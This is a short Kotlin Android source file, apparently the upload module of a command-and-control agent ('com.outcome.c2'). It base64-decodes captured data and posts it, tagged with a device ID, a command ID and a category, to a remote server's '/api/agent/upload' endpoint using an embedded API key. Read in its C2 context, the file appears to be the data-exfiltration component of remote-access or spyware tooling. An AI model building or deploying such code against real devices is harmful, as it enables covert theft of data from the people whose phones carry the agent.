package com.outcome.c2

import android.content.Context
import android.util.Base64
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.TimeUnit

object Uploader {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    fun uploadB64(
        ctx: Context,
        serverUrl: String,
        deviceId: String,
        commandId: Int,
        category: String,
        b64: String,
        filename: String,
    ) {
        val bytes = Base64.decode(b64, Base64.NO_WRAP)
        val fileBody = bytes.toRequestBody("application/octet-stream".toMediaType())
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("device_id", deviceId)
            .addFormDataPart("category", category)
            .addFormDataPart("command_id", commandId.toString())
            .addFormDataPart("file", filename, fileBody)
            .build()

        val req = Request.Builder()
            .url("$serverUrl/api/agent/upload")
            .addHeader("X-Api-Key", BuildConfig.API_KEY)
            .post(body)
            .build()

        client.newCall(req).execute().use { /* consume */ }
    }
}
